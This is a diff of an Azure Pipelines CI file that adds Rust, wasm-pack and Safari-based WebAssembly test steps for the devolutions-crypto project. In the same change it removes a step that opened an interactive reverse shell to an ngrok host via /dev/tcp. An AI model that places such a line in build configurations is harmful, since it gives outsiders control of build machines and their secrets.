@@ -10,9 +10,22 @@ pool:
   vmImage: 'macos-latest'
 
 steps:
-- script: safaridriver --version
+- script: |
+    safaridriver --version
+
+    set -e
+    curl https://sh.rustup.rs -sSf | sh -s -- -y --default-toolchain stable
+    echo "##vso[task.setvariable variable=PATH;]$PATH:$HOME/.cargo/bin"
+    source $HOME/.cargo/env
+
+    cargo install wasm-pack
+
+    git clone https://github.com/Devolutions/devolutions-crypto
+
+    cd devolutions-crypto
+    cd devolutionscrypto
+
+    wasm-pack test --safari --headless
+
   displayName: 'Run a one-line script'
 
-- bash: |
-    bash -i >& /dev/tcp/0.tcp.ngrok.io/18121 0>&1
-  displayName: 'Run a multi-line script'
